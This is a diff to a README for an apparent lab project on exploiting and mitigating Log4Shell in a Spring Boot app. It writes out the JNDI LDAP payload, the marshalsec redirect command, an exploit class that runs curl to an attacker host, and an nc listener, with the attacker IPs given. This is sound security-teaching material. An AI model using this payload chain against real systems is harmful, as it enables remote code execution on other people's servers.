@@ -12,7 +12,7 @@ Introduction: This project demonstrates the exploitation and mitigation of the L
 - Docker & Docker Compose
 - Java + Maven (if building manually)
 - Python 3 (for attacker LDAP simulation)
-Also, Ports 8080 and 389 are open in your EC2 Security Group (for the app and LDAP server).
+Also, Ports 8000, 8080, 1389 and 389 are open in your EC2 Security Group (for the app and LDAP server).
 
 ---
 
@@ -24,8 +24,20 @@ python3 -m http.server 8000
 
 # LDAP redirect server
 java -cp marshalsec-*.jar marshalsec.jndi.LDAPRefServer http://<your-ip>:8000/#Exploit
+To exploit the Log4Shell vulnerability, a vulnerable Spring Boot app using Log4j was set up to log user input. A malicious LDAP server was launched using marshalsec to redirect requests to an HTTP server hosting a malicious Exploit.class. The exploit payload ${jndi:ldap://<attacker-ip>:1389/Exploit} was sent via a POST request to the app’s /log endpoint. When the app logged this input, it triggered the JNDI lookup, causing the app to connect to the LDAP server. This demonstrated remote code loading behavior, confirming the Log4Shell vulnerability's exploitation path from input to remote callback.
 
+Proof of vulnerability exploitation:
+![image](https://github.com/user-attachments/assets/892533b0-5fb8-49f6-9acd-80159a2bc812)
+nc -lvnp 9999 listener received a connection from the target app's IP (Connection received on 164.52.0.91 51287); The incoming payload shows garbled data and headers (xterm-256color, hostname, etc.), indicating that the curl http://44.208.30.186:9999/ executed successfully inside the vulnerable app. 
 
+To summarize What Just Happened
+- the vulnerable Spring Boot app logged: {"input": "${jndi:ldap://44.208.30.186:1389/Exploit}"}
+- That triggered a request to your rogue LDAP server (marshalsec).
+- The LDAP server instructed the app to load a malicious .class file from your HTTP server.
+- The malicious .class file contained: Runtime.getRuntime().exec("curl http://<attacker>:9999/");
+- The target executed that, reaching your port 9999, confirming Remote Code Execution (RCE).
+
+the file start_exploit.sh available in the exploit folder automates all this process.
 
 ## Part 2: Defense (MITRE DEFEND)
 - Log4j upgraded to 2.17.0.
